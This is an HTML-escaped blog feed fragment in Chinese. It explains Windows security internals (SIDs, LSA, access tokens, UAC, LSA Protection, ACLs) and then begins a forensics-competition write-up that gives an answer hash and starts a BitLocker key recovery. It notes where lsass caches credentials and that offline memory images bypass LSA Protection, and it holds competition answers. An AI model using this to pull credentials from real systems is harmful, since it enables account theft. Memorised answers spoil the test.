&lt;li&gt;系统完整性级别（操作系统核心进程）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完整性级别形成了额外的访问限制层&lt;/p&gt;
&lt;h3 id=&#34;身份验证&#34;&gt;身份验证
&lt;/h3&gt;&lt;p&gt;身份验证是核实安全主体是否确实是其所声称身份的过程，主要回答“你是谁？”这个问题&lt;/p&gt;
&lt;p&gt;身份验证确保访问者不是冒名顶替者，常见方式包括密码核对、智能卡认证、生物识别等&lt;/p&gt;
&lt;p&gt;需要注意的是，身份验证与授权是不同的概念，身份验证是授权的前提，但本身不等同于授权&lt;/p&gt;
&lt;h2 id=&#34;sid&#34;&gt;SID
&lt;/h2&gt;&lt;h3 id=&#34;什么是sid&#34;&gt;什么是SID
&lt;/h3&gt;&lt;p&gt;SID全称Security Identifier，即安全标识符，就是操作系统为每一个安全主体分配的、一个全局唯一且不可变的号码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;唯一性&lt;/strong&gt;：一个 SID 只会分配给一个安全主体，即使这个账户被删除，它的 SID 也不会被重新分配给新账户&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不变性&lt;/strong&gt;：账户可以改名，但它的 SID 永远不变&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;内部标识&lt;/strong&gt;：用户习惯使用用户名来识别账户，但Windows内核只认SID&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sid如何工作&#34;&gt;SID如何工作
&lt;/h3&gt;&lt;p&gt;SID是Windows安全模型的核心&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;创建与存储&lt;/strong&gt;：当一个账户或组被创建时，本地安全机构（LSA）或域控制器会为其生成一个唯一的 SID，并将其存储在安全数据库中（本地账户存在注册表的SAMHive中，域账户存在活动目录中）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;生成访问令牌&lt;/strong&gt;：当一个用户成功登录时，系统会为其创建一个访问令牌 (Access Token)，这个令牌就像一张临时通行证，里面包含了该用户的SID、该用户所属所有组的SID、以及该用户拥有的所有特权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问控制&lt;/strong&gt;：当该用户尝试访问一个资源（如文件或文件夹）时，系统会拿出用户的访问令牌，将其中的SID列表与资源的访问控制列表（ACL）进行比对，以决定是否授予访问权限&lt;/p&gt;
&lt;h3 id=&#34;sid的结构&#34;&gt;SID的结构
&lt;/h3&gt;&lt;p&gt;一个典型的、完整的 SID 结构如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;S  -  修订级别  -  颁发机构  -  域标识符 -  相对ID(RID)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们以一个例子来分解： &lt;strong&gt;&lt;code&gt;S-1-5-21-2127521184-1604012920-1887927527-500&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;S&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;固定前缀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;表明这是一个SID&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;1&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;修订级别&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目前所有SID的版本都是1&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;5&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;标识符颁发机构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里的&lt;code&gt;5&lt;/code&gt;代表 &lt;code&gt;NT Authority&lt;/code&gt;，即由WindowsNT系统安全机构颁发，这是最常见的一种&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;21-2127521184-1604012920-1887927527&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;域或本地计算机标识符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是一串唯一的数字，代表创建这个SID的计算机或域，同一台电脑上的所有本地账户都会共享这一串数字&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;500&lt;/code&gt;&lt;/strong&gt;：&lt;strong&gt;相对ID (RID)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这是 SID 的最后一部分，它在上述域标识符范围内是唯一的，真正用来区分不同的账户&lt;/p&gt;
&lt;p&gt;Windows 为一些内置账户预留了固定的 RID：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;500&lt;/strong&gt;：&lt;code&gt;Administrator&lt;/code&gt;（内置管理员账户）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;501&lt;/strong&gt;：&lt;code&gt;Guest&lt;/code&gt;（来宾账户）&lt;/li&gt;
&lt;li&gt;普通用户通常从 &lt;strong&gt;1000&lt;/strong&gt; 或 &lt;strong&gt;1001&lt;/strong&gt; 开始递增&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;众所周知的sid&#34;&gt;众所周知的SID
&lt;/h3&gt;&lt;p&gt;除了上述每个账户独有的SID，Windows还预定义了一些特殊的、固定的 SID&lt;/p&gt;
&lt;p&gt;它们在所有Windows系统上都具有相同的值和含义，代表了一些内置的身份或通用组&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;SID&lt;/th&gt;
          &lt;th&gt;通用名称&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-18&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Local System&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;本地系统账户，Windows系统中的最高权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-32-544&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Administrators&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;本地管理员组，属于这个组的成员都拥有管理员权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-1-0&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Everyone&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;所有用户组，范围最广，包括已登录的用户和匿名用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-11&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Authenticated Users&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;已认证用户组，代表所有通过了身份验证的账户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-2&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Network&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何通过网络登录的用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-6&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Service&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何以服务身份登录的实体&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;S-1-5-7&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Interactive&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;任何通过直接在本地登录的用户&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;lsa&#34;&gt;LSA
&lt;/h2&gt;&lt;h3 id=&#34;什么是lsa&#34;&gt;什么是LSA
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;LSA，全称本地安全机构 (Local Security Authority)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它是一个受保护的Windows子系统，核心职责是在单台计算机上强制执行系统的安全策略&lt;/p&gt;
&lt;p&gt;它是Windows 安全模型的中心，负责验证用户身份、管理用户权限并生成安全审计日志&lt;/p&gt;
&lt;p&gt;LSA的用户模式组件体现在一个名为&lt;code&gt;lsass.exe&lt;/code&gt;的关键系统进程中，是维持操作系统安全运行的必要进程，任何对&lt;code&gt;lsass.exe&lt;/code&gt;的终止都会导致系统在短时间内强制关机并提示安全错误&lt;/p&gt;
&lt;h3 id=&#34;访问令牌&#34;&gt;访问令牌
&lt;/h3&gt;&lt;p&gt;访问令牌Access Token是由LSA创建的内核管理对象，描述进程或线程的安全上下文&lt;/p&gt;
&lt;h4 id=&#34;包含的内容&#34;&gt;包含的内容
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;用户SID&lt;/strong&gt;：标明主体身份&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;组SID列表&lt;/strong&gt;：确定主体所属的所有安全组&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特权列表&lt;/strong&gt;：决定主体可执行的系统级特殊操作，如SeDebugPrivilege&lt;/p&gt;
&lt;h4 id=&#34;工作流程&#34;&gt;工作流程
&lt;/h4&gt;&lt;p&gt;当用户登录后，启动的每个进程都会继承该用户访问令牌的副本&lt;/p&gt;
&lt;p&gt;当进程尝试访问受保护资源时，内核的安全引用监视器（Security Reference Monitor，SRM）会取出进程访问令牌中的SID列表，与资源的访问控制列表（Access Control List，ACL）比较，决定是否允许或拒绝访问&lt;/p&gt;
&lt;h4 id=&#34;用户账户控制&#34;&gt;用户账户控制
&lt;/h4&gt;&lt;p&gt;用户账户控制（User Account Control，UAC）是基于访问令牌的“双令牌”机制&lt;/p&gt;
&lt;p&gt;传统的Windows系统中，用户经常以管理员权限登录，这导致所有程序默认拥有高权限，增加了系统被攻击和破坏的风险&lt;/p&gt;
&lt;p&gt;而UAC通过限制默认权限，减少系统受攻击面&lt;/p&gt;
&lt;p&gt;当管理员账户登录系统时，系统为其创建两个访问令牌：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;标准访问令牌（受限令牌）&lt;/strong&gt;：用于默认运行的应用程序，权限受限，防止程序执行高风险操作&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;完整访问令牌（管理员令牌）&lt;/strong&gt;：包含完整管理员权限，但只在用户明确授权时使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;普通用户账户只拥有标准令牌，无法提升权限&lt;/p&gt;
&lt;p&gt;当用户启动需要管理员权限的程序或操作（比如安装软件）时，系统会弹出UAC提示，要求用户确认操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;管理员账户&lt;/strong&gt;：弹出提示框，用户确认后程序使用完整访问令牌运行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;标准账户&lt;/strong&gt;：需要输入管理员账户的用户名和密码以获得权限提升&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;这保证了系统操作必须经过用户授权，避免恶意软件自动提升权限&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;lsa的功能&#34;&gt;LSA的功能
&lt;/h3&gt;&lt;h4 id=&#34;用户认证&#34;&gt;用户认证
&lt;/h4&gt;&lt;p&gt;LSA是所有用户登录请求的最终处理者&lt;/p&gt;
&lt;p&gt;无论是本地登录还是通过网络的域登录，凭证信息最终都会被传递给LSA进行验证&lt;/p&gt;
&lt;h4 id=&#34;访问令牌生成&#34;&gt;访问令牌生成
&lt;/h4&gt;&lt;p&gt;在用户身份验证成功后，LSA负责创建该用户的访问令牌 (&lt;code&gt;_TOKEN&lt;/code&gt;结构)&lt;/p&gt;
&lt;p&gt;该令牌是一个内核对象，它详细描述了用户的安全上下文，包括用户SID、所属组的SID列表、特权列表以及会话信息&lt;/p&gt;
&lt;h4 id=&#34;安全策略管理&#34;&gt;安全策略管理
&lt;/h4&gt;&lt;p&gt;LSA强制执行在本地安全策略 (&lt;code&gt;secpol.msc&lt;/code&gt;) 中定义的规则&lt;/p&gt;
&lt;p&gt;例如密码复杂度策略、账户锁定策略以及用户权限分配&lt;/p&gt;
&lt;h4 id=&#34;凭证缓存与管理&#34;&gt;凭证缓存与管理
&lt;/h4&gt;&lt;p&gt;为了支持网络认证（如NTLM）和单点登录（SSO），&lt;code&gt;lsass.exe&lt;/code&gt;进程的内存中会缓存多种形式的凭证数据&lt;/p&gt;
&lt;p&gt;包括 NTLM 哈希、Kerberos 票据，以及在某些配置下（如开启WDigest认证）的可逆加密或明文形式的密码&lt;/p&gt;
&lt;h4 id=&#34;安全审计&#34;&gt;安全审计
&lt;/h4&gt;&lt;p&gt;根据系统中配置的审计策略，LSA会生成安全事件日志（如登录成功/失败、对象访问等）&lt;/p&gt;
&lt;p&gt;它会将这些日志发送给事件日志服务（Event Log service）进行记录&lt;/p&gt;
&lt;h3 id=&#34;lsa认证流程&#34;&gt;LSA认证流程
&lt;/h3&gt;&lt;p&gt;以一个典型的本地交互式登录为例，LSA 在其中的工作流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;用户在登录界面（由&lt;code&gt;winlogon.exe&lt;/code&gt;管理）输入用户名和密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;winlogon.exe&lt;/code&gt; 将这些凭证安全地传递给&lt;code&gt;lsass.exe&lt;/code&gt;进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;lsass.exe&lt;/code&gt;接收到凭证后，调用相应的认证包，对于本地登录，通常是&lt;code&gt;msv1_0.dll&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;msv1_0.dll&lt;/code&gt;与安全帐户管理器(Security Account Manager, SAM)服务通信，请求验证密码&lt;/p&gt;
&lt;p&gt;SAM服务会比对提交的密码哈希与存储在SAM注册表配置单元中的哈希是否一致&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;验证成功后，LSA会创建一个包含该用户所有安全信息的访问令牌&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;LSA 将此令牌返回给&lt;code&gt;winlogon.exe&lt;/code&gt;，&lt;code&gt;winlogon.exe&lt;/code&gt;再使用该令牌来启动用户的初始进程（&lt;code&gt;userinit.exe&lt;/code&gt;），进而创建桌面环境（&lt;code&gt;explorer.exe&lt;/code&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;lsa的protection机制&#34;&gt;LSA的Protection机制
&lt;/h3&gt;&lt;p&gt;由于&lt;code&gt;lsass.exe&lt;/code&gt;内存的敏感性，微软在Windows8.1/Server2012R2及之后版本中引入了LSA Protection机制，其技术名称为&lt;strong&gt;受保护的进程之光 (Protected Process Light, PPL)&lt;/strong&gt;&lt;del&gt;什么鬼名字&lt;/del&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;通过在注册表中设置一个特定的键值：&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&lt;/code&gt;下的&lt;code&gt;RunAsPPL&lt;/code&gt;，让&lt;code&gt;lsass.exe&lt;/code&gt;进程可以在启动时被标记为一个受保护的进程&lt;/p&gt;
&lt;p&gt;Windows 内核的内存管理器会阻止任何非受保护的进程（即使是拥有管理员权限的进程）打开&lt;code&gt;lsass.exe&lt;/code&gt; 的句柄并请求读取其内存或注入代码&lt;/p&gt;
&lt;p&gt;只有拥有微软特定签名的、同样是受保护的进程（如杀毒软件）才能对其进行访问&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;此保护机制&lt;strong&gt;仅对活动的操作系统有效&lt;/strong&gt;，对于通过物理采集或虚拟机快照获得的离线内存镜像进行分析时LSA Protection无效，仍然可以使用Volatility等工具解析&lt;code&gt;lsass.exe&lt;/code&gt;的内存&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;授权机制&#34;&gt;授权机制
&lt;/h2&gt;&lt;p&gt;在Windows安全机制中，&lt;strong&gt;ACL（Access Control List，访问控制列表）&lt;/strong&gt; 和 &lt;strong&gt;ACE（Access Control Entry，访问控制条目）&lt;/strong&gt; 是实现授权控制的基础结构，用于定义和限制安全主体对系统对象的访问权限&lt;/p&gt;
&lt;h3 id=&#34;访问控制列表--acl&#34;&gt;访问控制列表 —— ACL
&lt;/h3&gt;&lt;p&gt;ACL 是附加在受保护对象（如文件、进程、注册表键、线程等）上的权限集合，用于控制哪些用户或组能够对该对象执行哪些操作&lt;/p&gt;
&lt;p&gt;ACL 分为两种类型：&lt;/p&gt;
&lt;h4 id=&#34;dacl&#34;&gt;DACL
&lt;/h4&gt;&lt;p&gt;全称Discretionary ACL，自由访问控制列表&lt;/p&gt;
&lt;p&gt;用于指定允许或拒绝某个主体访问对象的权限，是授权控制的核心部分&lt;/p&gt;
&lt;h4 id=&#34;sacl&#34;&gt;SACL
&lt;/h4&gt;&lt;p&gt;全称System ACL，系统访问控制列表&lt;/p&gt;
&lt;p&gt;用于指定系统是否应审计某个主体对对象的访问（例如记录成功或失败的访问尝试），用于安全审计&lt;/p&gt;
&lt;h3 id=&#34;访问控制条目--ace&#34;&gt;访问控制条目 —— ACE
&lt;/h3&gt;&lt;p&gt;ACL 由一个或多个 ACE 组成，每条 ACE 定义一个安全主体对对象的某种访问规则。ACE 是描述“谁能做什么”的最小授权单元。&lt;/p&gt;
&lt;h4 id=&#34;主要组成字段&#34;&gt;主要组成字段
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;SID（Security Identifier）&lt;/td&gt;
          &lt;td&gt;指定该条权限适用的安全主体（用户或用户组）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Type（类型）&lt;/td&gt;
          &lt;td&gt;标识是“允许访问”还是“拒绝访问”&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Access Mask（访问掩码）&lt;/td&gt;
          &lt;td&gt;描述具体的权限（如读取、写入、执行、删除等）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Flags（标志）&lt;/td&gt;
          &lt;td&gt;控制是否可继承、是否用于审计等附加属性&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;常见类型&#34;&gt;常见类型
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ACE 类型&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ACCESS_ALLOWED_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;允许某个 SID 执行指定操作&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;ACCESS_DENIED_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;拒绝某个 SID 执行指定操作&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;SYSTEM_AUDIT_ACE_TYPE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;审计某个 SID 的访问行为（记录日志）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;ace-匹配与权限判断流程&#34;&gt;ACE 匹配与权限判断流程
&lt;/h3&gt;&lt;p&gt;当一个用户（或进程）尝试访问某个对象时，系统会进行如下判断流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取该用户的访问令牌（包含 SID 和所属组列表）&lt;/li&gt;
&lt;li&gt;读取目标对象的 DACL，依序遍历其中的 ACE&lt;/li&gt;
&lt;li&gt;将访问令牌中的 SID 与每条 ACE 的 SID 进行比对&lt;/li&gt;
&lt;li&gt;遇到匹配的 Deny 类型 ACE → 立即拒绝访问&lt;/li&gt;
&lt;li&gt;遇到匹配的 Allow 类型 ACE → 记录允许的操作权限&lt;/li&gt;
&lt;li&gt;继续匹配，直到所有 ACE 遍历完成或提前拒绝&lt;/li&gt;
&lt;li&gt;如果请求的权限未被任何 ACE 显式允许 → 拒绝访问&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：ACE 在 DACL 中的顺序非常重要，Deny ACE 一般优先于 Allow ACE&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;继承机制与显式权限&#34;&gt;继承机制与显式权限
&lt;/h3&gt;&lt;p&gt;ACE 还可以具有继承性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;显式ACE&lt;/strong&gt;：直接定义在对象上的权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;继承ACE&lt;/strong&gt;：从上层容器（如文件夹）继承而来，可自动应用到子对象&lt;/li&gt;
&lt;li&gt;继承标志包括：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;OBJECT_INHERIT_ACE&lt;/code&gt;：继承给子对象&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CONTAINER_INHERIT_ACE&lt;/code&gt;：继承给子容器&lt;/li&gt;
&lt;li&gt;&lt;code&gt;INHERIT_ONLY_ACE&lt;/code&gt;：仅供继承使用，不适用于当前对象；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NO_PROPAGATE_INHERIT_ACE&lt;/code&gt;：仅继承一级，不再向下传递&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些继承规则支持管理员一次性配置整个目录或注册表项的权限，提升安全管理效率&lt;/p&gt;
&lt;h3 id=&#34;权限掩码常见值&#34;&gt;权限掩码常见值
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;权限&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;READ&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;读取对象数据（如文件内容、注册表值）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象数据&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;EXECUTE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;执行对象&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;DELETE&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;删除对象&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;READ_CONTROL&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;读取对象的安全描述符（但不包含 DACL）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE_DAC&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象的 DACL&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;WRITE_OWNER&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;修改对象的所有者&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;FULL_CONTROL&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;拥有全部权限（等价于管理员完全控制）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;对象安全描述符&#34;&gt;对象安全描述符
&lt;/h3&gt;&lt;p&gt;对象的安全信息不仅包括ACL，还包括以下结构，一起被称为安全描述符：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;含义&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;所有者&lt;/td&gt;
          &lt;td&gt;对象的拥有者，默认有修改权限&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;主组&lt;/td&gt;
          &lt;td&gt;通常在POSIX/UNIX环境兼容性使用&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;DACL&lt;/td&gt;
          &lt;td&gt;授权控制&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SACL&lt;/td&gt;
          &lt;td&gt;审计控制&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;通过&lt;code&gt;GetSecurityInfo&lt;/code&gt;、&lt;code&gt;SetSecurityInfo&lt;/code&gt;等 API，可以查询或修改对象的安全描述符&lt;/p&gt;
</description>
        </item>
        <item>
        <title>中科实数杯2023取证总结</title>
        <link>https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</link>
        <pubDate>Wed, 09 Jul 2025 21:17:30 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0%E6%9D%AF2023%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
        <description>&lt;img src="http://picture.928330.xyz/typora/t010423dafdaa0e3353.jpg" alt="Featured image of post 中科实数杯2023取证总结" /&gt;&lt;p&gt;第一次做题，写的比较细比较繁琐&lt;/p&gt;
&lt;h1 id=&#34;火眼证据分析&#34;&gt;火眼证据分析
&lt;/h1&gt;&lt;p&gt;火眼证据分析中新建案件，选择镜像文件检材一，打开就会自动创建分析任务进行分析：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709132752466&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709132752466.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709132752466.png&#34; alt=&#34;image-20250709132752466&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;也可以点击快速分析，选择任务进行分析：

&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709133222223&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709133222223.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709133222223.png&#34; alt=&#34;image-20250709133222223&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h1 id=&#34;检材1计算机磁盘镜像&#34;&gt;检材1(计算机磁盘镜像)
&lt;/h1&gt;&lt;h2 id=&#34;1检材一硬盘的-md5-值为多少&#34;&gt;1.检材一硬盘的 MD5 值为多少
&lt;/h2&gt;&lt;p&gt;计算哈希，选择md5&lt;/p&gt;
&lt;p&gt;计算过程需要对加密卷解密（文件 -&amp;gt; 右键加密分区 -&amp;gt; 解密），因此最好先把下一问做完再进行计算：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709144006846&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709144006846.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709144006846.png&#34; alt=&#34;image-20250709144006846&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80518BC0DBF3315F806E9EDF7EE13C12
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2检材一-bitlocker-的恢复密钥是多少&#34;&gt;2.检材一 BitLocker 的恢复密钥是多少
&lt;/h2&gt;&lt;p&gt;使用EFDD，配合检材三给出的的内存镜像爆破：&lt;/p&gt;
